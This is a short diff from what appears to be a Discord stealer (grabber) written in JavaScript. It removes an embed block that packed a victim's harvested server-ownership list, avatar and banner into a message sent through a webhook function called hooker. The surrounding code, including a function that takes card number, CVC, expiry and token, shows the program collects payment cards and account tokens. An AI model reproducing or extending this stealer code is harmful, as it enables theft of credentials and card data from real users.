@@ -1275,21 +1275,6 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
                     },
             },
-                {
-                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
-                    "color": config['embed-color'],
-                    "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
-
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
-                    "image": {
-                        'url': `${bannerurl}`,
-                    },
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
-            }
         ]
         }
         hooker(params)
